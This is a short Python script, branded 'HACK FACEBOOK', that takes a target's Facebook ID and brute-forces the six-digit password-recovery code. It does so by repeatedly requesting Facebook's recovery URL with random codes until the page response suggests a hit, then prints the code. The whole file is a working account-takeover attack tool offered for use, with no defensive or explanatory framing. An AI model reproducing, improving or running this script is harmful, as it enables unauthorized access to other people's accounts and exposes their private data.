import random 
import requests,os
from rich import print
from rich.panel import Panel
import sys

q = '\033[1;30m'
w = '\033[1;31m'
e = '\033[1;32m'
r = '\033[1;33m'
t = '\033[1;34m'
y = '\033[1;35m'
u = '\033[1;36m'
i = '\033[1;37m'

user ="1234567890"
print('Guessing a Facebook recovery code')
print('HACK FACEBOOK')
id=input(r+"ENTER ID FACEBOOK :")
good=0
bad=0

os.system('clear')
print(Panel('''[green]

╭╮╭╮╭┳━━━┳━━━┳━━━┳━━━╮
┃┃┃┃┃┃╭━╮┃╭━╮┣╮╭╮┃╭━━╯
┃┃┃┃┃┃┃╱┃┃┃╱┃┃┃┃┃┃╰━━╮
┃╰╯╰╯┃┃╱┃┃┃╱┃┃┃┃┃┃╭━━╯
╰╮╭╮╭┫╰━╯┃╰━╯┣╯╰╯┃╰━━╮
╱╰╯╰╯╰━━━┻━━━┻━━━┻━━━╯
\033[1;33m𝑺𝑶𝑴𝑬 𝑯𝑨𝑪𝑲𝑬𝑹𝑺 𖠔 
\033[1;33mᏔᏫᏫᎠᎬ 
\033[1;33mV249V  /  C249C'''))
print('-'*50)
while True:
 cood = str("".join(random.choice(user)for i in range(6)))
 url=f"https://www.facebook.com/recover/password/?u={id}&n={cood}&f1=default_recover&sih=0&msgr=0"
 sin=requests.get(url).text

 if '<input type="text" class=' in sin:
  good+=1
  sys.stdout.write('\rOK:- %s  CP:- %s \r'%(good,bad))
  print (f"[green]True Cod  =>  :  {cood}")
  exit()
 else :
  bad+=1
  sys.stdout.write('\r True code:- %s  False Code:- %s \r'%(good,bad))
  